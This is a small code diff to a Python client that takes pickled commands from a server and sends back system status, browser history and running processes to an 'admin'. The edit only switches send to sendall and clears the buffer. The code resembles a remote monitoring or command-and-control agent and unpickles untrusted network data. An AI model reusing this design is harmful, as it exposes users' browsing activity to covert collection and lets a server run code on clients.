@@ -116,13 +116,14 @@ class client:
                 data = pickle.loads(data)
             if len(data) != 0:
                 if data['command']=='status':
-                    self.server.send(pickle.dumps({'command':'sendadmin','data':self.commands.status()}))
+                    self.server.sendall(pickle.dumps({'command':'sendadmin','data':self.commands.status()}))
                 elif data['command']=='history':
                     self.server.sendall(pickle.dumps({'command':'sendadmin','data':self.commands.bhistory()}))
                 elif data['command']=='listprocess':
                     self.server.sendall(pickle.dumps({'command':'sendadmin','data':self.commands.running_process()}))
                 else:
                     pass
+                data = b''
 
     def start(self):
         print('starting')
